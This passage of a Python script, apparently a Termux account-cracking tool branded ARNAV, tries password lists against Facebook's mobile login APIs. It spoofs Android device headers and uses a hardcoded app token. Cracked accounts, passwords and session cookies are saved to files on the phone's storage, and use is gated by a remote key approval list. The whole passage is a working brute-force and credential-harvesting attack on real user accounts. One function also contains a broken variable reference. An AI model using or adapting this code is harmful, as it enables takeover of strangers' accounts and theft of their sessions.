                        data = {'adid':str(uuid.uuid4()),
                        'email':ids,
                        'password':pas,
                        'cpl':'true',
                        'credentials_type':'device_based_login_password',
                        "source": "device_based_login",
                        'error_detail_type':'button_with_disabled',
                        'source':'login',
                        'format':'json',
                        'generate_session_cookies':'1',
                        'generate_analytics_claim':'1',
                        'generate_machine_id':'1',
                        "locale":"en_US",
                        "client_country_code":"US",
                        'device':'',
                        'device_id':device_id,
                        "method": "auth.login",
                        "fb_api_req_friendly_name": "authenticate",
                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
                        head = {
                        'content-type':'application/x-www-form-urlencoded',
                        'x-fb-sim-hni':str(random.randint(2e4,4e4)),
                        'x-fb-connection-type':'unknown',
                        'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'user-agent':'',
                        'x-fb-net-hni':str(random.randint(2e4,4e4)),
                        'x-fb-connection-bandwidth':str(random.randint(2e7,3e7)),
                        'x-fb-connection-quality':'EXCELLENT',
                        'x-fb-friendly-name':'authenticate',
                        'accept-encoding':'gzip, deflate',
                        'x-fb-http-engine':     'Liger'}
                        url1= 'https://b-api.facebook.com/method/auth.login'
                        po = requests.post(url1,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{Y}ARNAV-OK{B}❳{Y} '+ids+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{X2}COOKIES{B}❳>{X2} "+coki)
                                        open('/sdcard/ARNAV-FILE-M2-OK.txt', 'a').write(ids+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(ids)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}ARNAV-CP{B}❳{Y} '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ARNAV-CP.txt','a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M1 |__________________#
def rndm1(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{Y}ARNAV-M1{B}❳{Y} %s {B}|{Y} OK{B}|{Y}CP{Y} %s{B}|{Y}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua_string= "Dalvik/2.1.0 (Linux; U; Android 10; SM-N960F Build/QP1A.190711.020) [FBAN/Orca-Android;FBAV/257.1.0.21.120;FBPN/com.facebook.orca;FBLC/en_US;FBBV/205865103;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-N960F;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=1080,height=2094};FB_FW/1;] FBBK/1"
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data={
                        'adid': str(uuid.uuid4()),
                        'format': 'json',
                        'device_id': str(uuid.uuid4()),
                        'email': uid,
                        'password': pas,
                        'generate_analytics_claims': '1',
                        'community_id': '',
                        'cpl': 'true',
                        'try_num': '1',
                        'family_device_id': str(uuid.uuid4()),
                        'credentials_type': 'password',
                        'source': 'login',
                        'error_detail_type': 'button_with_disabled',
                        'enroll_misauth': 'false',
                        'generate_session_cookies': '1',
                        'generate_machine_id': '1',
                        'currently_logged_in_userid': '0',
                        'locale': 'en_GB',
                        'client_country_code': 'GB',
                        'fb_api_req_friendly_name': 'authenticate'}

                        head={
                        'User-Agent': ua_string,
                        'Accept-Encoding':  'gzip, deflate',
                        'Accept': '*/*',
                        'Connection': 'keep-alive',
                        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'X-FB-Friendly-Name': 'authenticate',
                        'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': 'unknown',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-FB-HTTP-Engine': 'Liger'}
                        url1= 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url1,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{Y}ARNAV-OK{B}❳{Y} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{X2}COOKIES{B}❳>{X2} "+coki)
                                        open('/sdcard/ARNAV-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}ARNAV-CP{B}❳{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ARNAV-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M2 |__________________#
def rndm2(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{Y}ARNAV-M2{B}❳{Y} %s {B}|{Y} OK{B}|{Y}CP{Y} %s{B}|{Y}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        user_agent= "Dalvik/2.1.0 (Linux; U; Android 11; RMX2155 Build/RP1A.200720.011) [FBAN/MessengerLite;FBAV/287.0.0.3.117;FBPN/com.facebook.mlite;FBLC/cs_CZ;FBBV/345379814;FBCR/SAZKAmobilCZ;FBMF/realme;FBBD/realme;FBDV/RMX2155;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=2.55,width=1080,height=2173};]"
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data={
                        'adid': str(uuid.uuid4()),
                        'format': 'json',
                        'device_id': str(uuid.uuid4()),
                        'email': uid,
                        'password': pas,
                        'generate_analytics_claims': '1', 
                        'credentials_type': 'password',
                        'source': 'login',
                        'error_detail_type': 'button_with_disabled',
                        'enroll_misauth': 'false', 
                        'generate_session_cookies': '1', 
                        'generate_machine_id': '1', 
                        'meta_inf_fbmeta': '', 
                        'currently_logged_in_userid': '0', 
                        'fb_api_req_friendly_name': 'authenticate'}

                        head={
                        'User-Agent': user_agent, 
                        'Accept-Encoding': 'gzip, deflate', 
                        'Accept': '*/*', 
                        'Connection': 'keep-alive', 
                        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
                        'X-FB-Friendly-Name': 'authenticate', 
                        'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)), 
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
                        'X-FB-Connection-Type': 'unknown',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-FB-HTTP-Engine': 'Liger'}
                        url="https://api.facebook.com/method/auth.login"
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{Y}ARNAV-OK{B}❳{Y} '+uid+f' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{X2}COOKIES{B}❳>{X2} "+coki)
                                        open('/sdcard/ARNAV-RANDOM-M1-OK.txt', 'a').write(uid+' | '+pas+' |-> '+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}ARNAV-CP{B}❳{Y} '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ARNAV-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| RANDOM METHOD M3 |__________________#
def rndm3(uid,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r{B}❲{Y}ARNAV-M3{B}❳{Y} %s {B}|{Y} OK{B}|{Y}CP{Y} %s{B}|{Y}%s '%(loop,len(oks),len(cps)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua_string= "Dalvik/2.1.0 (Linux; U; Android 11; SM-A326U Build/RP1A.200720.012) [FBAN/FB4A;FBAV/348.0.0.39.118;FBPN/com.facebook.katana;FBLC/en_US;FBBV/338919009;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBDV/SM-A326U;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=1.875,width=720,height=1465};FB_FW/1;FBRV/0;]"
                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
                        jazoest = li2+j1
                        data={
                        'adid': str(uuid.uuid4()),
                        'format': 'json',
                        'device_id': str(uuid.uuid4()),
                        'email': uid,
                        'password': pas,
                        'generate_analytics_claims': '1',
                        'community_id': '',
                        'cpl': 'true',
                        'try_num': '1',
                        'family_device_id': str(uuid.uuid4()),
                        'credentials_type': 'password',
                        'source': 'login',
                        'error_detail_type': 'button_with_disabled',
                        'enroll_misauth': 'false',
                        'generate_session_cookies': '1',
                        'generate_machine_id': '1',
                        'currently_logged_in_userid': '0',
                        'locale': 'en_GB',
                        'client_country_code': 'GB',
                        'fb_api_req_friendly_name': 'authenticate'}

                        head={
                        'User-Agent': ua_string,
                        'Accept-Encoding':  'gzip, deflate',
                        'Accept': '*/*',
                        'Connection': 'keep-alive',
                        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'X-FB-Friendly-Name': 'authenticate',
                        'X-FB-Connection-Bandwidth': str(random.randint(20000, 40000)),
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Connection-Type': 'unknown',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-FB-HTTP-Engine': 'Liger'}
                        url1= 'https://b-graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=head).json()
                        if 'session_key' in po:
                                        print(f'\r\r{B}❲{Y}ARNAV-OK{B}❳{Y} '+uid+f' | '+pas+'\033[38;5;123m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f"\r\r{B}❲{X2}COOKIES{B}❳>{X2} "+coki)
                                        open('/sdcard/ARNAV-RANDOM-M1-OK.txt', 'a').write(uid+'|'+pas+'|'+coki+"\n")
                                        oks.append(uid)
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print(f'\r\r{B}❲{Y}ARNAV-CP{B}❳{Y} '+uid+' | '+pas+'\033[38;5;123m')
                                                open('/sdcard/ARNAV-CP.txt','a').write(uid+'|'+pas+'\n')
                                                cps.append(uid)
                                                break
                                        else:
                                                break
                        else:
                                        continue
                loop+=1
        except Exception as e:
                pass
#__________________| End |__________________#


def apvdef():
   a=str(os.geteuid())
   b=str(os.getlogin())
   y="".join(a+b)
   key=f"A{y}V"
   row=httpx.get("https://github.com/ARN9VH3R3/Impulse/blob/main/Approval.txt").text
   if key in row:
     menu()
   else:
     os.system("clear")
     print(logo)
     print(" Your key is not approved")
     print(" Please get approve")
 #    print(lin)
     print(" Your key : "+key)
     os.system("termux-open https://m.me/arnav.inxid3")
     sys.exit()
     
apvdef()